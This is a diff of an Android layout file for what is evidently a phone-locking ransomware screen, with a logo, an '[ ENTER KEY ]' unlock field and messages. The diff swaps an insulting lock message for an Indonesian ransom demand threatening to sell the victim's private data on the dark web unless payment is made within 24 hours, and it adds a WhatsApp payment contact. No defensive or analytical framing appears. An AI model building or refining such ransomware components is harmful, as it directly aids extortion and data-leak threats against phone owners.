@@ -19,10 +19,10 @@
 
         <ImageView
             android:id="@+id/v_logo"
-            android:layout_width="165dp"
-            android:layout_height="165dp"
+            android:layout_width="140dp"
+            android:layout_height="140dp"
             android:src="@drawable/garuda"
-            android:layout_marginBottom="10dp" />
+            android:layout_marginBottom="5dp" />
 
         <View
             android:layout_width="match_parent"
@@ -42,28 +42,30 @@
 
         <TextView
             android:id="@+id/v_msg"
-            android:layout_width="wrap_content"
+            android:layout_width="match_parent"
             android:layout_height="wrap_content"
             android:layout_marginTop="10dp"
-            android:text="YOUR PHONE HAS BEEN LOCKED\n YOU ARE TOO STUPID, FUCK YOU"
+            android:text="Segera bayar tebusan jika hp anda mau berfungsi kembali, jika tidak segera di bayar dalam waktu 24 jam data privasi anda akan kami sebarkan dan di perjual beli kan di situs dark web"
             android:textColor="#212121"
-            android:textSize="16sp"
+            android:textSize="14sp"
             android:textStyle="bold"
             android:fontFamily="sans-serif-black"
-            android:gravity="center" />
+            android:gravity="center"
+            android:paddingStart="10dp"
+            android:paddingEnd="10dp" />
 
         <TextView
             android:id="@+id/v_display"
-            android:layout_width="245dp"
-            android:layout_height="50dp"
-            android:layout_marginTop="10dp"
+            android:layout_width="220dp"
+            android:layout_height="45dp"
+            android:layout_marginTop="8dp"
             android:background="@drawable/input_glow"
             android:gravity="center"
             android:hint="[ ENTER KEY ]"
             android:letterSpacing="0.2"
             android:textColor="#ff360c"
             android:textColorHint="#424242"
-            android:textSize="18sp"
+            android:textSize="16sp"
             android:textStyle="bold"
             android:fontFamily="sans-serif-black" />
 
@@ -94,10 +96,20 @@
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:layout_marginTop="10dp"
+            android:layout_marginTop="8dp"
+            android:text="Contact WhatsApp: +62 812-3456-7890"
+            android:textColor="#212121"
+            android:textSize="14sp"
+            android:fontFamily="sans-serif"
+            android:textStyle="bold" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="5dp"
             android:text="Leave me alone. I'm working."
             android:textColor="#212121"
-            android:textSize="16sp"
+            android:textSize="14sp"
             android:fontFamily="sans-serif"
             android:textStyle="bold|italic" />
 
